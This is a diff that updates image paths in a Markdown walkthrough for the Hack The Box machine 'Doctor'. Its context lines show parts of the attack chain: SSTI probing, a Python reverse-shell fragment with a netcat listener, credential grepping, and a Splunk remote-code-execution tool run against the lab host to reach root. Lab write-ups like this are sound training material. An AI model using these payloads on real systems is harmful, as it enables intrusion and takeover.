@@ -1,6 +1,10 @@
+---
+description: 'HTB URL: https://www.hackthebox.com/machines/doctor'
+---
+
 # Doctor-Walkthrough
 
-<figure><img src="../../.gitbook/assets/cover-photo.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/cover-photo.jpg" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -8,9 +12,11 @@
 
 _A Thorough Web App Security Walkthrough_&#x20;
 
+## HTB URL: [https://www.hackthebox.com/machines/doctor](https://www.hackthebox.com/machines/doctor)
+
 ***
 
-### **🚀 Why Web App Security?**
+### **Why Web App Security?**
 
 Before diving in, let’s address _why_ we’re here:
 
@@ -72,7 +78,7 @@ nmap -sV -sC -Pn -T4 10.10.10.209
 **Scan Results**:\
 
 
-<figure><img src="../../.gitbook/assets/nmap-results.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/nmap-results.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -87,7 +93,7 @@ nmap -sV -sC -Pn -T4 10.10.10.209
 
 Visiting `http://10.10.10.209` gets us a “Health Solutions” page. From here on out, lets pretend that Health Solutions is our client asking us to do a Web App Pentest:
 
-<figure><img src="../../.gitbook/assets/homepage.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/homepage.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -121,7 +127,7 @@ Add:
 
 #### **Navigating to doctors.htb**
 
-<figure><img src="../../.gitbook/assets/login.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/login.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -143,7 +149,7 @@ We see:
 
 We’ll create an account to see the next stage:
 
-<figure><img src="../../.gitbook/assets/register.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/register.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -182,7 +188,7 @@ Again, this is **extra knowledge for web app pentesters**, not a required step f
 
 After registration, we see:
 
-<figure><img src="../../.gitbook/assets/home-doctors.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/home-doctors.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -190,7 +196,7 @@ There’s a “New Message” feature at `/Home`. We should open **Burp Suite** 
 
 #### **New Message**: Potential XSS, SQLi, or Template Injection
 
-<figure><img src="../../.gitbook/assets/post-new.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/post-new.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -206,13 +212,13 @@ Given my **TCM Security** training, I note the fastest tests: XSS or template in
 <h1>xss</h1><strong>xss</strong>
 ```
 
-<figure><img src="../../.gitbook/assets/xss-payload.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/xss-payload.png" alt=""><figcaption></figcaption></figure>
 
 No reflection, **the site filters** our markup. Possibly **OWASP A03:2021 – Injection** is partially mitigated. Let’s pivot to **Template Injection**.
 
 Lets check out the source code:
 
-<figure><img src="../../.gitbook/assets/source-code-xss.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/source-code-xss.png" alt=""><figcaption></figcaption></figure>
 
 We learn that it is being filtered out, so we either have to look for ways to bypass the filtering to get a food in the door for vertical movement, but lets move on to another attack for now and return to it later if we aren't successful.
 
@@ -232,11 +238,11 @@ If it triggers a 500 error, we have injection.
 
 Lets put it in the title and content sections, we don't know which one will process it so just to be on the safe side lets see what happens here:
 
-<figure><img src="../../.gitbook/assets/post-polygot.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/post-polygot.png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src="../../.gitbook/assets/polyglot-reflected.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/polyglot-reflected.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -246,13 +252,13 @@ It gets reflected back but sanitized, no 500 error. Similar to the XSS payload, 
 
 We find a clue in the source about an **/archive** endpoint:
 
-<figure><img src="../../.gitbook/assets/source-code-archive (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/source-code-archive (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
 Visiting `/archive` yields an **error page**:
 
-<figure><img src="../../.gitbook/assets/archive-error.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/archive-error.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -269,7 +275,7 @@ From **PayloadsAllTheThings**, we know:
 
 We’ll also consult the handy **flowchart** below (screen shot is from payloadsallthethings):
 
-<figure><img src="../../.gitbook/assets/ssti-flowchart.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/ssti-flowchart.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -286,13 +292,13 @@ Let’s pop open **Burp Suite** and watch the **HTTP history** for `/home` and `
 
 * **BurpSuite /home endpoint**:
 
-<figure><img src="../../.gitbook/assets/burp-server-identity.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/burp-server-identity.png" alt=""><figcaption></figcaption></figure>
 
 
 
 * **BurpSuite /archive endpoint**:
 
-<figure><img src="../../.gitbook/assets/archive-49.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/archive-49.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -307,7 +313,7 @@ This is good news! Now that we have a potential **SSTI** and a strong guess it�
 
 Let’s post **another** new message using only the Title field this time (so we’re not cluttering up the page with multiple payloads). Revisit **/archive**, crack open the source, and if all goes well, you’ll see **49** (from our previous payload) and now **7777777**. That all but confirms **Jinja2**. Next stop: **RCE** territory!
 
-<figure><img src="../../.gitbook/assets/archive-jinja-payload.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/archive-jinja-payload.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -417,19 +423,19 @@ s.connect(("ip",4444))
 4. `nc -lvnp 4444`
 5. Browse to `/archive` to make the server parse our post.
 
-<figure><img src="../../.gitbook/assets/title-payload.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/title-payload.png" alt=""><figcaption></figcaption></figure>
 
 
 
 We see the post was accepted. When we load `/archive`, it should attempt to run our Python one-liner. If the IP and port match your listener, you should catch a reverse shell:
 
-<figure><img src="../../.gitbook/assets/jinja-payload-failed.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/jinja-payload-failed.png" alt=""><figcaption></figcaption></figure>
 
 
 
 Even though this screenshot says "failed," if your payload is correct, it may still reach out to your listener. If you only see a quick response like the contents of `flag.txt`, that means you forgot to switch `cat flag.txt` to `/bin/bash -i`. Once you make that change and reload `/archive`, you should see:
 
-<figure><img src="../../.gitbook/assets/reverse-shell-success.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/reverse-shell-success.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -469,7 +475,7 @@ Now that we have a shell, we look around for anything that can help us pivot. A 
 * `-R` tells grep to search recursively in subdirectories.
 * `-o` prints the matching parts only.
 
-<figure><img src="../../.gitbook/assets/enum-user-creds.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/enum-user-creds.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -495,7 +501,7 @@ su shaun
 
 If the password works, you should see this:
 
-<figure><img src="../../.gitbook/assets/login-shaun.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/login-shaun.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -514,7 +520,7 @@ I checked inside `shaun` and sure enough, **user.txt** was sitting there. Let’
 cat user.txt
 ```
 
-<figure><img src="../../.gitbook/assets/userflag.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/userflag.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -531,7 +537,7 @@ During our initial Nmap scan, we noticed Splunk running on port 8089. Splunk has
 * `ps aux` displays all running processes.
 * `grep splunk` filters the list to show only lines containing "splunk."
 
-<figure><img src="../../.gitbook/assets/grep-splunk-proc.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/grep-splunk-proc.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -557,7 +563,7 @@ We attempt a simple command:
 
 `python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.38 --payload id`
 
-<figure><img src="../../.gitbook/assets/pySplunkError (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pySplunkError (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -708,13 +714,13 @@ This payload **manually recreates a pipe (`|`)** to keep the connection open:
 
 ### Let's run our payload:
 
-<figure><img src="../../.gitbook/assets/pysplunkRCE.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pysplunkRCE.png" alt=""><figcaption></figcaption></figure>
 
 It connects, and no authentication issues, so now lets check the shell on your netcat listener and see what we get
 
 And oh my, what a thing of beauty, we get a shell, and most importantly, we have root.
 
-<figure><img src="../../.gitbook/assets/root.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/root.png" alt=""><figcaption></figcaption></figure>
 
 We can see a root environment. Use `ls` or `pwd` to verify, then:
 
